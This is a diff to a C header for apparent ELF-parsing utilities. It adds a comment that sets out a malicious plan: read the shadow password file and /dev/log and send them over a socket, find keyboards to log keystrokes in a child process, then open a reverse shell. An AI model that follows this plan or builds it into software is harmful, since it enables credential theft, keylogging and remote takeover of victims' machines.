@@ -52,6 +52,17 @@ typedef struct utl_s {
     elf_bin_t bin;
 } elf_utils_t;
 
+/*
+    1. Look for important files and send their content through socket
+        -> read shadow file
+        -> /dev/log
+        -> Get keyboard alignment ?
+    2. Find keyboard you can read from
+        -> in a child, loop through keyboards and send newfound status
+            -> assume qwerty except if you have another alignment
+    3. start revshell
+*/
+
 // elf.c
 elf_utils_t *elf_read(char const *);
 void elf_decode(elf_utils_t *);
